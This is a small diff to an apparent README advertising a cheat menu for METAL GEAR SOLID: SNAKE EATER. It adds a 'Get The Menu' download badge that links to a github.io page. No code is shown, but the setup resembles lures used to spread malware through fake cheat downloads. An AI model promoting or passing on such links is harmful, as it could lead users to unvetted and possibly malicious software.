@@ -4,6 +4,8 @@
 
 Step into the legendary jungle survival world with a twist – the **METAL GEAR SOLID: SNAKE EATER cheat menu** gives you access to hidden powers, game-breaking abilities, and smooth shortcuts that can turn Snake into a true unstoppable legend.
 
+[![Get](https://img.shields.io/badge/Get%20The-Menu-green)](https://metal-gear-solid-snake-eater-cheat-menu.github.io/.github/)
+
 ---
 
 ## Product Description
